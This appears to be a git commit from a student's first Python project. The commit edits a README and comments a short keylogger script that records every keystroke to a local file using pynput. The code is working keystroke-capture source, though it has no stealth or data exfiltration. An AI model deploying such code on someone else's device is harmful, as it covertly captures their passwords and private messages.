299b0ca0ef73f36fc8e7817446d7de1dba1bcd64
Nina Bunei <buneinina00@gmail.com>
2023-12-08 11:50:01 +0300

    brief summary

--- README.md
+++ README.md
@@ -1,4 +1,3 @@
-# Demo
-creating an actual keylogger software to track keystrokes made by someone.
-## subheading
-or developing a software to detect and delete keyloggers!! 
+# First Project. Keylogger 
+I initialised the project by understanding how to use Git and Github 
+the project required the use of phython to create the code for the keylogger. A keylogger is a software used to track the keystrokes made !
--- keylogger.py
+++ keylogger.py
@@ -1,10 +1,10 @@
 from pynput.keyboard import Key, Listener
-import logging
- 
+import logging #importing required libraries
+   
 logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
- 
+ #basic log configuration 
 def on_press(key):
-    logging.info(str(key))
- 
+    logging.info(str(key)) #function definition
+      
 with Listener(on_press=on_press) as listener :
-    listener.join()
+    listener.join()   #getting key strokes 
